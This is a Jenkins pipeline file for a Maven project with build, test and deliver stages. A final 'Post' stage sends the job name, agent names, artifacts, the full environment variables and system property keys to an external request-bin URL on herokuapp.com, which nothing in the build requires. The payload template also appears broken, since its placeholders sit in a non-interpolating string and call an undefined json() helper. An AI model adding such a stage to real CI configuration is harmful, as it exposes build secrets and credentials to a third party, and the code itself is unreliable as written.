pipeline {
    agent {
        docker {
            image 'maven:3-alpine'
            args '-v /root/.m2:/root/.m2'
        }
    }
    stages {
        stage('Build') {
            steps {
                sh 'mvn -B -DskipTests clean package'
            }
        }
        stage('Test') {
            steps {
                sh 'mvn test'
            }
            post {
                always {
                    junit 'target/surefire-reports/*.xml'
                }
            }
        }
        stage('Deliver') { 
            steps {
                sh './jenkins/scripts/deliver.sh' 
            }
	}
	stage('Post') { 
            steps {
               httpRequest acceptType: 'APPLICATION_JSON', consoleLogResponseBody: true, httpMode: 'POST', requestBody: '''{
			  "items":       ${JOB_NAME},
			  "computers":   ${ json( jenkins.computers.collect{ it.displayName }) },
			  "moduleRoots": ${ json( build.moduleRoots )},
			  "artifacts":   ${ json( build.artifacts )},
			  "env":         ${ json( env ) },
			  "properties":  ${ json( [ system: System.properties.keySet(), env: env.keySet() ]) }
			}''', responseHandle: 'NONE', url: 'https://requestbincweber.herokuapp.com/1day2kl1'
            }
        }
    }
}